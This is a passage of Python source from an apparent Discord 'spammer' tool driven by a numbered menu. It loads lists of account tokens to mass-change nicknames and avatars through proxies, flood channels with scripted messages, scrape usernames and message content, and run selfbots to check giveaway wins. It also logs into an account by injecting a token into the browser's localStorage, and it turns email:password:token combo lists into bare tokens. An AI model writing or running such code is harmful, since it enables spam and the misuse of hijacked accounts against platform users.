                print(f"{Fore.LIGHTYELLOW_EX} {current_time} [+] Starting Task")
                threading.Thread(target=changenick, args=(server, nick, tokens)).start()
            else:
                tokens = input('Token: ')
                print(f"{Fore.LIGHTYELLOW_EX} {current_time} [+] Starting Task")
                threading.Thread(target=changenick, args=(server, nick, tokens)).start()

            time.sleep(5)
            exit = input('press any key: ')
            exit = clear()
            exit = spammer()

        elif choice == '10':
            tokens = open("input/tokens.txt", "r").read().splitlines()

            def usernmame(channelid):
                while True:
                    users = open("input/usersfilter.txt",
                                 "r").read().splitlines()  
                    filterr = True  
                    with open("input/tokens.txt", "r") as file:
                        allText = file.read()
                        words = list(map(str, allText.split()))
                        token = random.choice(words)  
                    headers = {
                        'authorization': token
                    }
                    r = requests.get(f'https://discord.com/api/v9/channels/{channelid}/messages', headers=headers)
                    jsoon = json.loads(r.text)
                    for log in jsoon:
                        guy = log['id']
                        print(log)
                        userr = log['author']['username']
                        for user in users:
                            if user == guy:
                                filterr = False  
                            else:
                                pass
                        guy2 = log['id']
                        if filterr == True:
                            try:
                                f2 = open('input/usernames.txt', "a") 
                                f2.write(f"{log['author']['username']}" + '\n')
                                f = open('input/usersfilter.txt', "a")  
                                f.write(f'{guy2}' + '\n')
                                f.close()
                                f2.close()
                            except:
                                pass
                        else:
                            pass

            channel = input('Channel ID: ')
            print(f"{Fore.LIGHTYELLOW_EX} {current_time} [+] Starting Task")
            usernmame(channel)

        elif choice == '11':
            def sender(channel, msg, token):
                headers = mainHeader(token)
                r = requests.post(f'https://discord.com/api/v9/channels/' + channel + '/messages', headers=headers,
                                  json={"content": msg, "tts": False})
                if r.status_code == 200:
                    print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} sent')
                if r.status_code != 200:
                    print(f'{Fore.LIGHTRED_EX}[-]{Fore.RESET} Cant send message')

            tokens = open('input/tokens.txt', 'r').read().splitlines()
            askfile = input('Name of file (ex: script.txt): ')
            msgfile = open(f'input/{askfile}', 'r').read().splitlines()
            channel = input('Channel ID: ')

            token = input('Token: ')
            delay = int(input('Delay: '))
            print(f"{Fore.LIGHTYELLOW_EX}[+] Starting Task")
            for message in msgfile:
                time.sleep(delay)
                threading.Thread(target=sender, args=(channel, message, token)).start()

        elif choice == '9':
            def changenick(server, nickname, token):
                headers = mainHeader(token)
                r = requests.patch(f"https://discord.com/api/v9/guilds/{server}/members/@me/nick", headers=headers,
                                   json={"nick": nickname})
                if r.status_code == 201 or r.status_code == 204:
                            print(
                                f"{Fore.LIGHTGREEN_EX} [+] {token[:50]}****** nickname changed!{Fore.RESET}")
                else:
                            print(
                                f"{Fore.LIGHTRED_EX} [!] {token[:50]}****** could not change nickname! {Fore.RESET}({Fore.LIGHTBLACK_EX}{r.content}{Fore.RESET})")

            tokens = open('input/tokens.txt', 'r').read().splitlines()
            server = input("Server ID: ")
            print(f"{Fore.LIGHTYELLOW_EX} {current_time} [+] Starting Task")
            for token in tokens:
                with open("input/usernames.txt", "r") as file:
                    allText = file.read()
                    words = list(map(str, allText.split()))
                    nick = random.choice(words)
                threading.Thread(target=changenick, args=(server, nick, token)).start()

        elif choice == '13':
            from selenium import webdriver
            from webdriver_manager.chrome import ChromeDriverManager

            Token = str(input("Token: "))
            driver = webdriver.Chrome(ChromeDriverManager().install())
            driver.maximize_window()
            driver.get('https://discord.com/login')
            time.sleep(1)
            driver.execute_script(
                'window.t = "' + Token + '";window.localStorage = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage;window.setInterval(() => window.localStorage.token = `"${window.t}"`); window.location.reload();')
            clear = lambda: os.system('cls')
            clear()
            exit = clear()
            exit = spammer()
            while True:
                time.sleep(3)

        elif choice == '14':
            import threading
            import random
            import json
            import time
            
            tokenformat=open('input/tokenstobeformatted.txt','r').read().splitlines()
            amountformatted=0
            def formatter(tokenformat):
                len(tokenformat.split(':')) == 4
                splitted = tokenformat.split(':')
                email = f"{splitted[0]}"
                password = f"{splitted[1]}"
                token = f"{splitted[2]}"
                with open("output/formatted.txt", "a") as f:
                    f.write(f"{token}\n")
                    f.close()
            for tokenformat in tokenformat:threading.Thread(target=formatter,args=(tokenformat,)).start();amountformatted+=1
            print(f"{amountformatted} Tokens Formatted")
            time.sleep(3)
            clear = lambda: os.system('cls')
            clear()
            exit = clear()
            exit = spammer()


        elif choice == '12':
            def messagelog(channelid):
                while True:
                    users = open("input/usersfilter.txt",
                                 "r").read().splitlines()  
                    filterr = True  
                    with open("input/tokens.txt", "r") as file:
                        allText = file.read()
                        words = list(map(str, allText.split()))
                        token = random.choice(words)  
                    headers = {
                        'authorization': token
                    }
                    r = requests.get(f'https://discord.com/api/v9/channels/{channelid}/messages', headers=headers)
                    jsoon = json.loads(r.text)
                    for log in jsoon:
                        guy = log['id']
                        for user in users:
                            if user == guy:
                                filterr = False  

                            else:
                                pass
                        guy2 = log['id']
                        f = open('input/usersfilter.txt', "a")  
                        f.write(f'{guy2}' + '\n')
                        f.close()
                        if filterr == True:
                            print(f"{log['author']['username']} sent {log['content']}")
                            f2 = open('messages.txt', "a")  
                            f2.write(f"{log['content']}" + "\n")
                            f2.close()
                        else:
                            pass

            channelId = input('Channel ID: ')
            print(f"{Fore.LIGHTYELLOW_EX} {current_time} [+] Starting Task")
            messagelog(channelId)
            
        elif choice == '15':
            img = input('Image example[image.png]: ')
            with open(img, 'rb') as f:
                byteform = base64.b64encode(f.read())
                imageurl1 = byteform.decode('utf-8')

            payload1 = {
                'avatar': f'data:image/png;base64,{imageurl1}'
            }

            def pfpchanger(token):
                try:
                    headers = mainHeader(token)
                    if askpro == 'y':
                        proxy = random.choice(open("input/proxies.txt").read().splitlines())
                        rd = rs.patch('https://discord.com/api/v9/users/@me', headers=headers,
                                      json=payload1, proxies={"http": f"{proxy}"})
                    elif askpro == 'n':
                        rd = rs.patch('https://discord.com/api/v9/users/@me', headers=headers,
                                      json=payload1)
                    else:
                        rd = rs.patch('https://discord.com/api/v9/users/@me', headers=headers,
                                      json=payload1)
                    if rd.status_code == 201 or rd.status_code == 204:
                            print(
                                f"{Fore.LIGHTGREEN_EX} [+] {token[:50]}****** changed pfp!{Fore.RESET}")
                    else:
                            print(
                                f"{Fore.LIGHTRED_EX} [!] {token[:50]}****** could not change pfp! {Fore.RESET}({Fore.LIGHTBLACK_EX}{rd.content}{Fore.RESET})")

                except:
                    print('Error...')

            askusetokens2 = input('Do you want to use tokens from tokens.txt file? y/n: ').lower()
            if askusetokens2 == 'y':
                print(f"{Fore.LIGHTYELLOW_EX} {current_time} [+] Starting Task")
                tokens = open('input/tokens.txt', 'r').read().splitlines()
                for token in tokens:
                    threading.Thread(target=pfpchanger(token)).start()
            elif askusetokens2 == 'n':
                tokens = input('Token: ')
                print(f"{Fore.LIGHTYELLOW_EX} {current_time} [+] Starting Task")
                threading.Thread(target=pfpchanger(tokens)).start()
            else:
                tokens = input('Token: ')
                print(f"{Fore.LIGHTYELLOW_EX} {current_time} [+] Starting Task")
                threading.Thread(target=pfpchanger(tokens)).start()

            time.sleep(5)
            exit = input('Press enter to return to menu:')
            exit = clear()
            exit = spammer()

            askusetokens2 = input('Do you want to use tokens from tokens.txt file? y/n: ').lower()
            if askusetokens2 == 'y':
                tokens = open('input/tokens.txt', 'r').read().splitlines()
                for token in tokens:
                    threading.Thread(target=pfpchanger(token)).start()
            elif askusetokens2 == 'n':
                tokens = input('Token: ')
                threading.Thread(target=pfpchanger(tokens)).start()
            else:
                tokens = input('Token: ')
                threading.Thread(target=pfpchanger(tokens)).start()
                
        elif choice == '17':
            from selenium import webdriver
            from webdriver_manager.chrome import ChromeDriverManager

            driver = webdriver.Chrome(ChromeDriverManager().install())
            driver.maximize_window()
            driver.get('https://aphrodite-labs.gitbook.io/guide/')
            time.sleep(1)
            clear = lambda: os.system('')
            clear()
            exit = clear()
            exit = spammer()

            while True:
                time.sleep(3)
        
        elif choice == '16':
            tokens = open('input/tokens.txt', 'r').read().splitlines()
            intents = discord.Intents.all()
            intents.members = True
            client = commands.Bot(command_prefix="!", case_insensitive=False, self_bot=True, intents=intents)

            def getheaders(token=None, content_type="application/json"):
                headers = {
                    "Content-Type": content_type,
                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
                }
                if token:
                    headers.update({"Authorization": token})
                return headers

            def messagelog(token, channelid, messageid):
                headers = {
                    'authorization': token
                }

                def getuserdata(token):
                    try:
                        return loads(urlopen(
                            Request("https://discordapp.com/api/v6/users/@me",
                                    headers=getheaders(token))).read().decode())
                    except:
                        pass

                user_data = getuserdata(token)
                user_id = user_data['id']
                r = requests.get(f'https://discord.com/api/v9/channels/{channelid}/messages', headers=headers)
                jsoon = json.loads(r.text)
                for log in jsoon:
                        if log['id'] == messageid and log['author']['id'] == '294882584201003009':
                            final = log['content'].split('>')
                            final1 = final[0].split('<')
                            ff1 = final1[1].split('@')
                            if ff1[1] == user_id:
                                print(
                                    f'---------------------------------------------------------------------\nFound a winner: {token}\n--------------------------------------------------------------------- ')
                                with open('output/winners.txt', 'w') as f:
                                    f.write(f'found winner: {token}')
                        else:
                            pass

            channelid = input('Channel ID: ')
            messageid = input('Message ID: ')


            def start():
                for token in tokens:
                    messagelog(token, channelid, messageid)

            start()

        


        else:
            print(f'{Fore.LIGHTRED_EX}Missclick?{Fore.RESET}')
            exit = input('Press enter to return to menu:')
            exit = clear()
            exit = spammer()
  

    spammer()